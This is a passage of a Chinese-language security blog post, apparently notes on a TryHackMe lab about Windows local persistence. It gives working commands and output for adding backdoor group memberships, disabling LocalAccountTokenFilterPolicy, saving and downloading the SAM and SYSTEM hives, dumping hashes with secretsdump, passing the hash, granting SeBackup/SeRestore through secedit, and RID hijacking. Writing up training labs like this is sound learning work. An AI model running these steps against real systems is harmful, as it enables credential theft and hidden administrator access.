@@ -1,0 +1,676 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMWindowsLocalPersistence | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction在目标的内部网络上获得第一个立足点后，您需要确保在真正获得关键信息之前不会失去对网络的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时要完成的首要任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需重新经历利用阶段。 您希望尽快建立持久性的原因有很多，包括：  重新利用并不总是可行的：一些不稳定的漏洞可能会在利用过程中杀死易受攻击的进程，让您">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMWindowsLocalPersistence">
+<meta property="og:url" content="http://mikannse.space/2024/08/01/THMWindowsLocalPersistence/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction在目标的内部网络上获得第一个立足点后，您需要确保在真正获得关键信息之前不会失去对网络的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时要完成的首要任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需重新经历利用阶段。 您希望尽快建立持久性的原因有很多，包括：  重新利用并不总是可行的：一些不稳定的漏洞可能会在利用过程中杀死易受攻击的进程，让您">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-08-01T05:37:41.000Z">
+<meta property="article:modified_time" content="2024-08-01T08:21:21.221Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/08/01/THMWindowsLocalPersistence/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMWindowsLocalPersistence',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-08-01 16:21:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMWindowsLocalPersistence</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-01T05:37:41.000Z" title="发表于 2024-08-01 13:37:41">2024-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-01T08:21:21.221Z" title="更新于 2024-08-01 16:21:21">2024-08-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMWindowsLocalPersistence"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在目标的内部网络上获得第一个立足点后，您需要确保在真正获得关键信息之前不会失去对网络的访问权限。建立持久性是我们作为攻击者在获得网络访问权限时要完成的首要任务之一。简而言之，持久性是指创建替代方法来重新获得对主机的访问权限，而无需重新经历利用阶段。</p>
+<p>您希望尽快建立持久性的原因有很多，包括：</p>
+<ul>
+<li><strong>重新利用并不总是可行的</strong>：一些不稳定的漏洞可能会在利用过程中杀死易受攻击的进程，让您有机会利用其中一些漏洞。</li>
+<li><strong>获得立足点很难重现</strong>：例如，如果您使用网络钓鱼活动获得首次访问权限，那么重复该活动以重新获得对主机的访问权限实在是太费力了。您的第二次活动可能也不会那么有效，让您无法访问网络。</li>
+<li><strong>蓝队正在追捕你</strong>：如果你的行为被检测到，任何用于获得你首次访问权限的漏洞都可能被修补。你在与时间赛跑！</li>
+</ul>
+<p>虽然你可以保留一些管理员的密码哈希并重新使用它来重新连接，但你总是冒着这些凭据在某个时候被轮换的风险。此外，还有一些更狡猾的方法可以让你重新获得对受感染机器的访问权限，这让蓝队的日子更难过。</p>
+<p>在这个房间里，我们将看看攻击者用来在 Windows 系统中建立持久性的最常见技术。在进入这个房间之前，建议熟悉 Windows 系统基础知识。你可以在以下链接中查看有关此事的房间：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsfundamentals1xbx">Windows 基础知识 1</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsfundamentals2x0x">Windows 基础知识 2</a></li>
+</ul>
+<p>Powershell 也在这个房间里被广泛使用。你可以在 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/powershell">使用 Powershell 进行黑客攻击</a> 房间中了解更多信息。</p>
+<h1 id="Tampering-With-Unprivileged-Accounts"><a href="#Tampering-With-Unprivileged-Accounts" class="headerlink" title="Tampering With Unprivileged Accounts"></a>Tampering With Unprivileged Accounts</h1><p>分配组成员身份</p>
+<p>对于这部分任务，我们假设您已经转储了受害机器的密码哈希，并成功破解了正在使用的非特权帐户的密码。</p>
+<p>让非特权用户获得管理权限的直接方法是使其成为<strong>管理员</strong>组的一部分。我们可以使用以下命令轻松实现这一点：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; net localgroup administrators thmuser0 /add</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将允许您使用 RDP、WinRM 或任何其他可用的远程管理服务访问服务器。</p>
+<p>如果这看起来太可疑，您可以使用 <strong>Backup Operators</strong> 组。此组中的用户没有管理权限，但可以读取/写入系统上的任何文件或注册表项，忽略任何配置的 DACL。这将允许我们复制 SAM 和 SYSTEM 注册表配置单元的内容，然后我们可以使用这些内容恢复所有用户的密码哈希，使我们能够轻松升级到任何管理帐户。</p>
+<p>为此，我们首先将帐户添加到 Backup Operators 组：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; net localgroup "Backup Operators" thmuser1 /add</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由于这是一个非特权帐户，因此除非我们将其添加到<strong>远程桌面用户</strong> (RDP) 或<strong>远程管理用户</strong> (WinRM) 组，否则它无法通过 RDP 或 WinRM 返回到计算机。我们将使用 WinRM 执行此任务：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; net localgroup "Remote Management Users" thmuser1 /add</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果您现在尝试从攻击者的机器进行连接，您会惊讶地发现，即使您属于备份操作员组，您也无法按预期访问所有文件。快速检查我们分配的组会发现我们是备份操作员的一部分，但该组已被禁用：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                             Type             SID          Attributes</span><br><span class="line">====================================== ================ ============ ==================================================</span><br><span class="line">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only</span><br><span class="line">BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这是由于用户帐户控制 (UAC) 造成的。UAC 实现的功能之一 <strong>LocalAccountTokenFilterPolicy</strong> 会在远程登录时剥夺任何本地帐户的管理权限。虽然您可以通过 UAC 从图形用户会话提升您的权限（在此处阅读有关 UAC 的更多信息 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsfundamentals1xbx">此处</a>），但如果您使用的是 WinRM，您将被限制在有限的访问令牌中，没有管理权限。</p>
+<p>为了能够从您的用户那里重新获得管理权限，我们必须通过将以下注册表项更改为 1 来禁用 LocalAccountTokenFilterPolicy：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦完成所有这些设置，我们就可以开始使用后门用户了。首先，让我们建立一个 WinRM 连接，并检查是否已为用户启用了备份操作员组：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321</span><br><span class="line">        </span><br><span class="line">*Evil-WinRM* PS C:\&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                           Type             SID          Attributes</span><br><span class="line">==================================== ================ ============ ==================================================</span><br><span class="line">Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\High Mandatory Level Label            S-1-16-12288</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后我们继续备份 SAM 和 SYSTEM 文件，并将它们下载到我们的攻击者机器上：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; reg save hklm\system system.bak</span><br><span class="line">    The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; reg save hklm\sam sam.bak</span><br><span class="line">    The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; download system.bak</span><br><span class="line">    Info: Download successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; download sam.bak</span><br><span class="line">    Info: Download successful!</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong>如果 Evil-WinRM 下载文件的时间过长，请随意使用任何其他传输方法。</p>
+<p>有了这些文件，我们可以使用“secretsdump.py”或其他类似工具转储所有用户的密码哈希值：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::</span><br><span class="line">thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后，执行 Pass-the-Hash 以管理员权限连接到受害机器：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3</span><br></pre></td></tr></tbody></table></figure>
+
+<p>特殊权限和安全描述符</p>
+<p>无需修改任何组成员身份即可实现与将用户添加到备份操作员组类似的结果。特殊组之所以特殊，是因为操作系统默认为它们分配了特定权限。<strong>权限</strong>只是在系统本身上执行任务的能力。它们包括简单的事情，例如具有关闭服务器的能力，以及非常特权的操作，例如能够拥有系统上任何文件的所有权。完整的可用权限列表可在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a> 中找到以供参考。</p>
+<p>对于备份操作员组，它默认分配了以下两个权限：</p>
+<ul>
+<li><strong>SeBackupPrivilege：</strong>用户可以读取系统中的任何文件，忽略任何现有的 DACL。</li>
+<li><strong>SeRestorePrivilege</strong>：用户可以写入系统中的任何文件，忽略任何现有的 DACL。</li>
+</ul>
+<p>我们可以将此类权限分配给任何用户，而不管他们的组成员身份如何。为此，我们可以使用 <code>secedit</code> 命令。首先，我们将当前配置导出到临时文件：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">secedit /export /cfg config.inf</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们打开文件并将我们的用户添加到有关 SeBackupPrivilege 和 SeRestorePrivilege 的配置行中：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png" alt="config.inf contents"></p>
+<p>我们最终将.inf 文件转换为.sdb 文件，然后使用该文件将配置加载回系统：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">secedit /import /cfg config.inf /db config.sdb</span><br><span class="line"></span><br><span class="line">secedit /configure /db config.sdb /cfg config.inf</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，您应该拥有一个具有与任何备份操作员同等权限的用户。该用户仍然无法通过 WinRM 登录系统，所以让我们对此采取一些措施。我们不会将用户添加到远程管理用户组，而是更改与 WinRM 服务关联的安全描述符以允许 thmuser2 连接。将 <strong>安全描述符</strong> 视为 ACL，但应用于其他系统设施。</p>
+<p>要打开 WinRM 安全描述符的配置窗口，您可以在 Powershell 中使用以下命令（您需要为此使用 GUI 会话）：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Set-PSSessionConfiguration</span> <span class="literal">-Name</span> Microsoft.PowerShell <span class="literal">-showSecurityDescriptorUI</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将打开一个窗口，您可以在其中添加 thmuser2 并为其分配连接到 WinRM 的全部权限：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png" alt="WinRM security descriptor"></p>
+<p>完成此操作后，我们的用户可以通过 WinRM 进行连接。由于用户具有 SeBackup 和 SeRestore 权限，我们可以重复上述步骤，从 SAM 恢复密码哈希，然后重新与管理员用户建立连接。</p>
+<p>请注意，要让此用户完全使用给定的权限，您必须更改 <strong>LocalAccountTokenFilterPolicy</strong> 注册表项，但我们已经这样做了，以获取上一个标志。</p>
+<p>如果您检查用户的组成员身份，它将看起来像普通用户。一点可疑！</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; net user thmuser2</span><br><span class="line">User name                    thmuser2</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Users</span><br><span class="line">Global Group memberships     *None</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再次，我们假设我们已经将凭据转储到服务器上，并且拥有 thmuser2 的密码。让我们使用 WinRM 连接其凭据：</p>
+<p>RID 劫持</p>
+<p>另一种无需管理员身份即可获得管理权限的方法是更改某些注册表值，让操作系统认为您是管理员。</p>
+<p>创建用户时，会为其分配一个称为 <strong>相对 ID (RID)</strong> 的标识符。RID 只是一个代表整个系统中用户的数字标识符。用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们就可以让 Windows 通过将相同的 RID 关联到两个帐户，为非特权用户分配管理员访问令牌。</p>
+<p>在任何 Windows 系统中，默认管理员帐户都分配有 <strong>RID = 500</strong>，普通用户通常具有 <strong>RID &gt;= 1000</strong>。</p>
+<p>要查找任何用户分配的 RID，您可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">Name                SID</span><br><span class="line">Administrator       S-1-5-21-1966530601-3185510712-10604624-500</span><br><span class="line">DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503</span><br><span class="line">Guest               S-1-5-21-1966530601-3185510712-10604624-501</span><br><span class="line">thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008</span><br><span class="line">thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009</span><br><span class="line">thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010</span><br></pre></td></tr></tbody></table></figure>
+
+<p>RID 是 SID 的最后一位（thmuser3 为 1010，管理员为 500）。SID 是一个标识符，允许操作系统跨域识别用户，但对于此任务，我们不会太在意其余部分。</p>
+<p>现在我们只需将 RID=500 分配给 thmuser3。为此，我们需要使用 Regedit 访问 SAM。SAM 仅限于 SYSTEM 帐户，因此即使管理员也无法编辑它。要以 SYSTEM 身份运行 Regedit，我们将使用 psexec，它位于您计算机的“C:\tools\pstools”中：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\tools\pstools&gt; PsExec64.exe -i -s regedit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>从 Regedit 中，我们将转到“HKLM\SAM\SAM\Domains\Account\Users\”，其中将有机器中每个用户的密钥。由于我们想要修改 thmuser3，因此我们需要搜索其 RID 为十六进制 (1010 = 0x3F2) 的密钥。在相应的密钥下，将有一个名为 <strong>F</strong> 的值，它在位置 0x30 处保存用户的有效 RID：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png" alt="RID hijacking 1"></p>
+<p>请注意，RID 使用小端表示法存储，因此其字节显示为反转。</p>
+<p>现在我们将用十六进制的管理员 RID（500 = 0x01F4）替换这两个字节，并交换字节（F401）：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png" alt="RID hijacking 2"></p>
+<p>thmuser3 下次登录时，LSASS 会将其与管理员相同的 RID 关联，并授予他们相同的权限。</p>
